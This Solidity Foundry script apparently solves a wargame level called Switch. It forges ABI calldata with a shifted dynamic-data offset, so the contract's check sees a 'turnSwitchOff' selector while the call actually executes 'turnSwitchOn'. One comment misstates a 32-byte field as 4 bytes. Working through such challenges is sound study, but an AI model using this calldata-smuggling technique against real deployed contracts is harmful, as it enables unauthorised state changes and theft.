// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                        LEVEL 29 - SWITCH                     │
// ================================================================

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
    function offSelector() external returns (bytes4);
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        ISwitch switchContract = ISwitch(targetContractAddress);

        vm.startBroadcast();
        bytes4 flipSwitchSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 offSelector = switchContract.offSelector();
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));

        bytes memory callData = abi.encodePacked(
            flipSwitchSelector, // 4 bytes - 30c13ade (flipSwitch selector)
            uint256(0x60), // 32 bytes - offset for the data field
            new bytes(32), // 32 bytes - zero padding
            offSelector, // 4 bytes - 20606e15 (turnSwitchOff selector)
            new bytes(28), // 28 bytes - zero padding needed to stop packing with the next field
            uint256(0x4), // 4 bytes - length of data field
            onSelector // 4 bytes - 76227e12 (turnSwitchOn selector)
        );

        // Call flipSwitch with this manipulated data
        (bool success,) = targetContractAddress.call(callData);
        require(success, "Call failed");

        vm.stopBroadcast();
    }
}
